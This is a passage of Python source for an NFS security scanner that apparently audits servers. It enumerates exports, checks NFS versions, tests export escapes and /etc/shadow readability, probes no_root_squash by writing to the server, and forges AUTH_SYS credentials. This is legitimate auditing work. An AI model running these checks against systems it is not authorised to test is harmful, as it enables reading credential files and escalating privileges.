    diropargs = xdrdef.nfs3_type.diropargs3(dir=parent_fh, name=name)
    attrs = xdrdef.nfs3_type.sattr3(xdrdef.nfs3_type.set_mode3(set_it = True, mode = mode), xdrdef.nfs3_type.set_uid3(set_it = True, uid=uid), xdrdef.nfs3_type.set_gid3(set_it = True, gid = gid), xdrdef.nfs3_type.set_size3(set_it = False), xdrdef.nfs3_type.set_atime(set_it = False), xdrdef.nfs3_type.set_mtime(set_it = False))
    mkdirargs = xdrdef.nfs3_type.MKDIR3args(diropargs, attrs)
    return nfs3_client.proc(xdrdef.nfs3_const.NFSPROC3_MKDIR, mkdirargs)

def nfs3_rmdir(nfs3_client: nfs3client.NFS3Client, parent_fh: bytearray, name: bytearray):
    parent_fh = xdrdef.nfs3_type.nfs_fh3(data=parent_fh)
    diropargs = xdrdef.nfs3_type.diropargs3(dir=parent_fh, name=name)
    rmdirargs = xdrdef.nfs3_type.RMDIR3args(diropargs)
    return nfs3_client.proc(xdrdef.nfs3_const.NFSPROC3_RMDIR, rmdirargs)

#def nfs3_getattr(nfs3_client: nfs3client.NFS3Client, parent_fh: bytearray, name: bytearray):
#    parent_fh = xdrdef.nfs3_type.nfs_fh3(data=parent_fh)
#    diropargs = xdrdef.nfs3_type.diropargs3(dir=parent_fh, name=name)
#    lookupargs = xdrdef.nfs3_type.LOOKUP3args(diropargs)
#    return nfs3_client.proc(xdrdef.nfs3_const.NFSPROC3_GETATTR, lookupargs)


def nfs4_get_root_fh(nfs4_client: nfs4client.NFS4Client | nfs4client.SessionRecord):
    putrootfh = xdrdef.nfs4_type.nfs_argop4(argop=xdrdef.nfs4_const.OP_PUTROOTFH)
    getfh = xdrdef.nfs4_type.nfs_argop4(argop=xdrdef.nfs4_const.OP_GETFH)
    return nfs4_client.compound(ops=[putrootfh, getfh])

def nfs4_list_root_dir(nfs4_client: nfs4client.NFS4Client | nfs4client.SessionRecord):
    putrootfh = xdrdef.nfs4_type.nfs_argop4(argop=xdrdef.nfs4_const.OP_PUTROOTFH)
    readdirargs = xdrdef.nfs4_type.READDIR4args(cookie = 0, cookieverf = b"", dircount = 1000, maxcount = 10000, attr_request=(1 << xdrdef.nfs4_const.FATTR4_FILEHANDLE) | (1 << xdrdef.nfs4_const.FATTR4_OWNER))
    readdir = xdrdef.nfs4_type.nfs_argop4(argop=xdrdef.nfs4_const.OP_READDIR, opreaddir=readdirargs)
    return nfs4_client.compound(ops=[putrootfh, readdir])

def nfs4_list_dir(nfs4_client: nfs4client.NFS4Client | nfs4client.SessionRecord, file_handle: bytearray):
    putfhargs = xdrdef.nfs4_type.PUTFH4args(object = file_handle)
    putrootfh = xdrdef.nfs4_type.nfs_argop4(argop=xdrdef.nfs4_const.OP_PUTFH, opputfh=putfhargs)
    readdirargs = xdrdef.nfs4_type.READDIR4args(cookie = 0, cookieverf = b"", dircount = 1000, maxcount = 10000, attr_request=(1 << xdrdef.nfs4_const.FATTR4_FILEHANDLE) | (1 << xdrdef.nfs4_const.FATTR4_OWNER) | (1 << xdrdef.nfs4_const.FATTR4_TYPE) | (1 << xdrdef.nfs4_const.FATTR4_MODE))
    readdir = xdrdef.nfs4_type.nfs_argop4(argop=xdrdef.nfs4_const.OP_READDIR, opreaddir=readdirargs)
    return nfs4_client.compound(ops=[putrootfh, readdir])

def nfs4_secinfo(nfs4_client: nfs4client.NFS4Client | nfs4client.SessionRecord, file_handle: bytearray, file_name: bytearray):
    putfhargs = xdrdef.nfs4_type.PUTFH4args(object = file_handle)
    putfh = xdrdef.nfs4_type.nfs_argop4(argop=xdrdef.nfs4_const.OP_PUTFH, opputfh=putfhargs)
    secinfoargs = xdrdef.nfs4_type.SECINFO4args(file_name)
    secinfo = xdrdef.nfs4_type.nfs_argop4(argop=xdrdef.nfs4_const.OP_SECINFO, opsecinfo=secinfoargs)
    return nfs4_client.compound(ops=[putfh, secinfo])

def nfs41_init_session(nfs4_client: nfs4client.NFS4Client):
    try:
        return nfs4_client.new_client_session(b"nfs_analyze" + str(time.time_ns()).encode(options.charset))
    except rpc.rpc.RPCError as e:
        pass
    except nfs4lib.NFS4Error as e:
        pass
    except Exception as e:
        print(type(e))
        print(e)
    return None


def init_client(inner_fn, **args):
    client = None
    try:
        client = inner_fn(**args)
        return client
    except OSError as e:
        if options.verbose_errors:
            print(f"OSError: {e}")
            traceback.print_exc()
    except rpc.rpc.RPCError as e:
        if options.verbose_errors:
            print(f"RPCError: {e}")
            traceback.print_exc()
    except Exception as e:
        print(f"Unknown exception {e}")
    if client != None:
        client.stop()
        client = None
    return None

def portmap_init_client(hostname):
    portmap_client = nfs3client.PORTMAPClient(host=hostname, timeout=options.timeout)
    portmap_client.proc(xdrdef.portmap_const.PMAPPROC_NULL, 0, "void")
    return portmap_client

def mount_init_client(hostname, port):
    mountd_client = nfs3client.Mnt3Client(host=hostname, port=port, timeout=options.timeout)
    mountd_client.proc(xdrdef.mnt3_const.MOUNTPROC3_NULL, 0, "void")
    return mountd_client

def nfs3_init_client(hostname, port):
    nfs3_client = nfs3client.NFS3Client(host=hostname, port=port, secure=True, timeout=options.timeout)
    nfs3_client.null()
    return nfs3_client

def nfs4_init_client(hostname, port, minorversion):
    nfs4_client = nfs4client.NFS4Client(host=hostname, port=port, secure=True, minorversion=minorversion, timeout=options.timeout)
    nfs4_client.null()
    return nfs4_client


def nfs4_check_minorversion(nfs4_client: nfs4client.NFS4Client | nfs4client.SessionRecord):
    try:
        if nfs4_client == None:
            return False
        if nfs4_get_root_fh(nfs4_client).status == xdrdef.nfs4_const.NFS4ERR_MINOR_VERS_MISMATCH:
            return False
    except:
        pass
    return True

def nfs4_check_session_minorversion(hostname, port, minorversion, result):
    nfs4_client = init_client(nfs4_init_client, hostname=hostname, port=port, minorversion=minorversion)
    if nfs4_client != None:
        if minorversion != 0:
            nfs4_client = nfs41_init_session(nfs4_client)

        result[f"4.{minorversion}"] = nfs4_check_minorversion(nfs4_client)
        nfs_stop_client(nfs4_client)
    
    time.sleep(options.delay)

def nfs_stop_client(nfs4_client: nfs4client.NFS4Client | nfs4client.SessionRecord | None):
    if nfs4_client == None:
        return
    if isinstance(nfs4_client, nfs4client.SessionRecord):
        try:
            destroy_session_args = xdrdef.nfs4_type.DESTROY_SESSION4args(dsa_sessionid = nfs4_client.sessionid)
            destroy_session = xdrdef.nfs4_type.nfs_argop4(argop=xdrdef.nfs4_const.OP_DESTROY_SESSION, opdestroy_session=destroy_session_args)
            nfs4_client.client.c.compound(ops=[destroy_session])

            destroy_clientid_args = xdrdef.nfs4_type.DESTROY_CLIENTID4args(dca_clientid = nfs4_client.client.clientid)
            destroy_clientid = xdrdef.nfs4_type.nfs_argop4(argop=xdrdef.nfs4_const.OP_DESTROY_CLIENTID, opdestroy_clientid=destroy_clientid_args)
            nfs4_client.client.c.compound(ops=[destroy_clientid])

            nfs4_client.client.c.stop()
        except:
            pass

def nfs_check_version_support(hostname, port, json_out):
    result = {
        "3": False,
        "4.0": False,
        "4.1": False,
        "4.2": False
    }

    time.sleep(options.delay)

    nfs3_client = init_client(nfs3_init_client, hostname=hostname, port=port)
    if(nfs3_client != None):
        result["3"] = True
        nfs3_client.stop()

    time.sleep(options.delay)

    nfs4_check_session_minorversion(hostname, port, 0, result)
    nfs4_check_session_minorversion(hostname, port, 1, result)
    nfs4_check_session_minorversion(hostname, port, 2, result)

    json_out["versions"]["status"] = JSONStatus.OK
    json_out["versions"]["supported"] = result
    return result

def nfs_print_version_support(version_support: dict):
    print("Supported NFS versions reported by nfsd:")
    data = [("Version", "Supported")] + [(version, "Yes" if supported else "No") for version, supported in version_support.items()]
    print_table(data)

def parse_args():
    parser = ArgumentParser(formatter_class=ArgumentDefaultsHelpFormatter)

    parser.add_argument("target", type=str, nargs="*",
                        help="List of targets, each target can be an IP address, a hostname or a path to a file containing a host on each line")
    parser.add_argument("--check-no-root-squash", action="store_true",
                        help="Test if no_root_squash is enabled on the server which can be used for privilege escalation on clients. \n WARNING: THIS WRITES DATA ON THE SERVER")
    parser.add_argument("--btrfs-subvolumes", type=int, default=16,
                        help="Number of subvolumes to try to read when escaping a BTRFS export")
    parser.add_argument("--delay", type=int, default=1000,
                        help="Number of milliseconds to wait between connections. If this value is too low, connections might fail")
    parser.add_argument("--timeout", type=int, default=3000,
                        help="Socket timeout in milliseconds")
    parser.add_argument("--skip-version-check", action="store_true",
                        help="Skip version check to speed up the test")
    parser.add_argument("--no-color", action="store_true",
                        help="Disable colored output")
    parser.add_argument("--no-ping", action="store_true",
                        help="Do not ping clients reported by mount")
    parser.add_argument("--ping-timeout", type=int, default=1,
                        help="Number of seconds before a ping times out")
    parser.add_argument("--charset", type=str, default="utf-8",
                        help="charset used by the server")
    parser.add_argument("--json-file", type=str,
                        help="Output to a single json file")
    parser.add_argument("--json-dir", type=str,
                        help="Output to one json file per host in given directory")
    parser.add_argument("--findings-file", type=str,
                        help="Output a short summary of findings to a json file")
    parser.add_argument("--verbose-errors", action="store_true",
                        help="Verbose error logging")
    parser.add_argument("--reload-pynfs", action="store_true",
                        help="Reload pynfs after every host")
    
    return parser.parse_args()

def add_entry_to_dict(dict, key, value):
    if not key in dict:
        dict[key] = []
    dict[key].append(value)

def summarize_findings(json_result, findings):
    for hostname, host in json_result.items():
        if host["exports"]["status"] == JSONStatus.OK and "directories" in host["exports"] and len(host["exports"]["directories"]) != 0:
            for directory, export in host["exports"]["directories"].items():
                if export["mount_result"] == "MNT3_OK" and "sys" in export["auth_methods"]:
                    add_entry_to_dict(findings["mountable_exports"], hostname, directory)
                    if export["escape"]["status"] == JSONStatus.VULNERABLE:
                        add_entry_to_dict(findings["escapable_exports"], hostname, directory)
                        if export["escape"]["etc_shadow"]["status"] == JSONStatus.VULNERABLE:
                            add_entry_to_dict(findings["etc_shadow_exports"], hostname, directory)
                    if export["no_root_squash"]["status"] == JSONStatus.VULNERABLE:
                        add_entry_to_dict(findings["no_root_squash_exports"], hostname, directory)
        if host["windows_handle_signing"]["status"] == JSONStatus.VULNERABLE:
            findings["no_signing_hosts"].append(hostname)

def parse_hosts_file(file_name):
    try:
        with open(file_name, "r") as file:
            lines = file.readlines()
            lines = [line.strip() for line in lines]
            lines = [line for line in lines if len(line) != 0]
            return lines
    except Exception as e:
        print(f"Error reading hosts file: {str(e)}")
        return []

def write_json_file(hostname, json_data):
    if options.json_dir != None:
        with open(os.path.join(options.json_dir, f"{hostname}.json"), "w") as out_file:
            json.dump(json_data, out_file, indent=4)

def scan_host(hostname, json_out):
    if options.reload_pynfs:
        for name in list(sys.modules.keys()):
            if name.startswith("rpc") or name.startswith("nfs4") or name.startswith("gssapi"):
                importlib.reload(sys.modules[name])
        #importlib.reload(sys.modules["rpc.rpc"])
        #importlib.reload(sys.modules["nfs4.nfs3client"])
        #importlib.reload(sys.modules["nfs4.nfs4client"])
    exports = None
    mount_results = None
    print(f"Checking host {hostname}")

    portmap_client = init_client(portmap_init_client, hostname=hostname)
    if portmap_client != None:
        try:
            mappings = portmap_client.proc(xdrdef.portmap_const.PMAPPROC_DUMP, 0, "pmaplistptr")
        except rpc.rpc.RPCDeniedError as e:
            print("Error requesting portmap listing, probably NAS with strict security settings")
            json_out["portmap"]["status"] = JSONStatus.ERROR
            json_out["portmap"]["reason"] = "strict_security"

            return json_out
        pmap_print_summary(mappings, json_out)
        mountd_port = pmap_get_mountd_port(mappings)
        portmap_client.stop()
        if mountd_port != -1:
            mountd_client = init_client(mount_init_client, hostname=hostname, port=mountd_port)
            if mountd_client != None:
                print()
                try:
                    exports = mountd_client.proc(xdrdef.mnt3_const.MOUNTPROC3_EXPORT, 0, "exports")
                    mount_results = mount_get_all_info(mountd_client, exports)
                    mount_print_details(exports, mount_results, json_out)
                    print()
                    mount_print_clients(mount_get_all_clients(mountd_client), json_out)
                    mountd_client.stop()
                except rpc.rpc.RPCDeniedError as e:
                    print("Error requesting exports, probably NAS with strict security settings")
                    json_out["exports"]["status"] = JSONStatus.ERROR
                    json_out["exports"]["reason"] = "strict_security"

                    return json_out
            else:
                print("Error connecting to Mountd")
        else:
            print("Server does not support Mountd, skipping NFSv3 checks")
    else:
        print("Server does not support Portmap, skipping NFSv3 checks")

    print()

    #Default value if version check is skipped to ensure windows compatiblity
    nfs_supported_versions = {
        "3": True,
        "4.0": False,
        "4.1": True,
        "4.2": False,
    }

    if not options.skip_version_check:
        nfs_supported_versions = nfs_check_version_support(hostname, 2049, json_out)
        if True in nfs_supported_versions.values():
            nfs_print_version_support(nfs_supported_versions)
        else:
            print(Coloring.error("No NFS server detected"))

            return json_out

    print()

    if nfs_supported_versions["3"] and exports != None and mount_results != None:
        nfs3_check_windows_signing(mount_results, json_out)
        print()

        nfs3_client = init_client(nfs3_init_client, hostname=hostname, port=2049)
        if nfs3_client == None:
            print(Coloring.error("Error connecting to NFSv3 server"))
        else:
            auth_sys = rpc.security.AuthSys()
            credential = auth_sys.init_cred(1000, 1000, b"test", 42, [1001, 1002])
            nfs3_client.set_cred(credential)
            nfs3_try_escape(nfs3_client, mount_results, json_out)

            if options.check_no_root_squash:
                nfs3_check_no_root_squash(nfs3_client, mount_results, json_out)
                print()

            nfs3_client.stop()

    time.sleep(options.delay)

    if nfs_supported_versions["4.0"] or nfs_supported_versions["4.1"] or nfs_supported_versions["4.2"]:
        minorversion = 0 if nfs_supported_versions["4.0"] else 1 if nfs_supported_versions["4.1"] else 2
        nfs4_client = init_client(nfs4_init_client, hostname=hostname, port=2049, minorversion=minorversion)
        if nfs4_client == None:
            print(Coloring.error("Error connecting to NFSv4 server"))
        else:
            auth_sys = rpc.security.AuthSys()
            credential = auth_sys.init_cred(1000, 1000, b"test", 42, [1001, 1002])
            nfs4_client.set_cred(credential)

            if minorversion != 0:
                nfs4_client = nfs41_init_session(nfs4_client)

            if nfs4_client == None:
                print(Coloring.error("Error creating NFSv4.1/4.2 session"))
            else:
                nfs4_show_overview(nfs4_client, json_out)
                nfs_stop_client(nfs4_client)

    return json_out

def main():
    global options

    json_result = dict()

    logging.getLogger().setLevel("WARNING")
    options = parse_args()

    options.delay = options.delay / 1000.0
    options.timeout = options.timeout / 1000.0

    if options.json_dir != None:
        if os.path.exists(options.json_dir):
            if not os.path.isdir(options.json_dir):
                print("Error: json-dir parameter is not a directory")
                return
            if len(os.listdir(options.json_dir)) != 0:
                print("Error: output directory not empty")
                return
        if not os.path.exists(options.json_dir):
            try:
                os.mkdir(options.json_dir)
            except Exception as e:
                print(f"Error creating output directory: {str(e)}")
                return

    if len(options.target) == 0:
        print("Error: no targets specified")
        return
    
    hosts = []

    for target in options.target:
        if os.path.isfile(target):
            hosts += parse_hosts_file(target)
        else:
            hosts.append(target)

    for hostname in hosts:
        json_out = copy.deepcopy(default_json_out)
        json_out["date"] = str(datetime.datetime.now())
        try:
            scan_host(hostname, json_out)
        except Exception as e:
            print(Coloring.error(f"Error scanning host {hostname}: {str(e)}"))
            traceback.print_exc()
            if options.json_dir != None:
                with open(os.path.join(options.json_dir, f"{hostname}.error"), "w") as f:
                    traceback.print_exc(None, f)

        json_result[hostname] = json_out
        write_json_file(hostname, json_out)
        
    if options.json_file != None:
        with open(options.json_file, "w") as f:
            json.dump(json_result, f, indent=4)

    if options.findings_file != None:
        findings = copy.deepcopy(default_findings)
        summarize_findings(json_result, findings)
        with open(options.findings_file, "w") as f:
            json.dump(findings, f, indent=4)

if __name__ == "__main__":
    main()
